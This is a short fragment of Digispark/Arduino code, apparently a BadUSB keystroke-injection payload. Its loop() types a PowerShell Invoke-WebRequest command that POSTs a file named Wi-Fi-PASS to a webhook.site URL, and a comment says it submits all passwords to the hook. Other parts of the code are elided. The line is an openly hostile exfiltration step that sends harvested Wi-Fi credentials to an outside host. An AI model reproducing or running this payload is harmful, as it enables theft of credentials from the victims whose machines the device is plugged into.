...
void loop() {
  ...
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/be73437b-b22a-49bb-85f7-9dd66099be3a -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
